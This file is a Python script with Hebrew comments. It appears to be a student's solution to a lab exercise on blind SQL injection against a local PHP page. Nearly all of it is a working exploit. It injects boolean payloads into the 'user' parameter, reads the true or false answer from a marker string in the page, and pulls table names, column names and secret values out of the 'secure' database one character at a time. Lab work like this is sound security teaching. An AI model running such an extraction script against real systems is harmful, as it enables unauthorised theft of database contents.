# מדוע נכתב הסקריפט ואיך הוא עזר לפתרון התרגיל:
# סקריפט זה נכתב כדי לפתור את סעיף 5 בתרגיל, העוסק בחולשת Blind SQL Injection.
# מכיוון שבשיטה זו מסד הנתונים אינו מדפיס את התוצאות למסך, עלינו לחלץ את המידע
# על ידי הצגת שאלות True/False (אמת או שקר) וניחוש התשובה תו אחר תו. הסקריפט עזר לי
# להפוך את תהליך הניחוש (Brute-force) לאוטומטי, לשלוח בקשות HTTP רבות במהירות,
# ולפענח את התשובות על סמך הימצאות המחרוזת "In wonderland right now",
# וכך לחלץ את המידע הנדרש ממסד הנתונים secure ביעילות.


import urllib.request
import urllib.parse
import string


BASE_URL = "http://localhost:8000/blindsqli.php?user="
# העוגייה לזיהוי מול השרת (יש לעדכן אם פג תוקפה)
MY_COOKIE = "PHPSESSID=1c1df5fba202f6a061f48d241143a071"


def check_boolean_query(payload, debug=False):
    """
    פונקציה זו משמשת כ"אורקל" (Oracle) שלנו.
    היא שולחת את השאילתה לשרת ובודקת האם התשובה היא אמת (True) או שקר (False),
    על סמך הימצאות המחרוזת המעידה על טעינת הפרופיל של אליס.
    """
    encoded_payload = urllib.parse.quote(payload)
    url = BASE_URL + encoded_payload
   
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Cookie': MY_COOKIE
    }
    req = urllib.request.Request(url, headers=headers)
   
    try:
        response = urllib.request.urlopen(req)
        html_content = response.read().decode('utf-8')
       
        # התנאי שמאשר שהשאילתה הלוגית שהזרקנו החזירה True
        if "In wonderland right now" in html_content:
            return True
        else:
            return False
           
    except Exception as e:
        if debug:
            print(f"[-] Error during request: {e}")
        return False

def calculate_length(query):
    length = 0
    for i in range(1, 100):
        payload = f"alice' AND LENGTH(({query})) = {i} -- a"
        if check_boolean_query(payload):
            length = i
            break
    
    # couldn't find answer with length between 1 to 100
    if length == 0:
        return None
   
    return length

def guess_query(query, length):
    # we assume that all characters contain only latin letters and digits.
    charset = string.ascii_letters + string.digits
    result = ""
    for i in range(1, length + 1):
        for char in charset:
            char_ascii = ord(char)
            payload = f"alice' AND ASCII(SUBSTRING(({query}), {i}, 1)) = {char_ascii} -- a"
            if check_boolean_query(payload):
                result += char
                break
    return result



def extract_query(query):
    length = calculate_length(query)
    if length is None:
        return None
    return guess_query(query, length)




if __name__ == "__main__":
    print("This script is performing a blind sql attack.")
    print("It can ask true or false questions to the database by trying to sign in as alice if an expression is true.")
    print("This script find all of the tables in the \'secure\' database (there\'s only one), look for all the columns for the table (again, only one) and find the values of the fields in the table.\n")
    # The following query ment to check if we can even access the db.
    if not check_boolean_query("alice' AND 1=1 -- a", debug=True):
        print("\nSanity Check FAILED! Make sure your Cookie hasn't expired.")
    else:
        sql_table_query = "SELECT table_name FROM information_schema.tables WHERE table_schema=0x736563757265 LIMIT 1"
        print("1. Extracting hidden table name...")
        table_name = extract_query(sql_table_query)
        print(f"   -> Table found: {table_name}\n")
       
        if table_name:
            # 2. חילוץ כמות השורות בטבלה שמצאנו
            count_query = f"SELECT COUNT(*) FROM secure.`{table_name}`"
            print("2. Extracting row count...")
            row_count_str = extract_query(count_query)
            print(f"   -> Number of rows: {row_count_str}\n")
           
            # 3. חילוץ שם העמודה בטבלה
            # הקידוד Hex הוא עבור המחרוזת של שם הטבלה שמצאנו
            col_name_query = "SELECT column_name FROM information_schema.columns WHERE table_name=0x3738396230353637386537663935356432636631323562306330353631366339 LIMIT 1"
            print("3. Extracting column name...")
            col_name = extract_query(col_name_query)
            print(f"   -> Column name: {col_name}\n")
           
            # 4. חילוץ הערכים (הדגלים) הסודיים מתוך הטבלה
            if row_count_str and col_name:
                row_count = int(row_count_str)
                print(f"4. Extracting {row_count} secret values from `{table_name}`...")
               
                for i in range(row_count):
                    val_query = f"SELECT {col_name} FROM secure.`{table_name}` LIMIT {i}, 1"
                    value = extract_query(val_query)
                    print(f"   => Value {i+1}: {value}")
        else:
            print("[-] Failed to find table name. Aborting.")
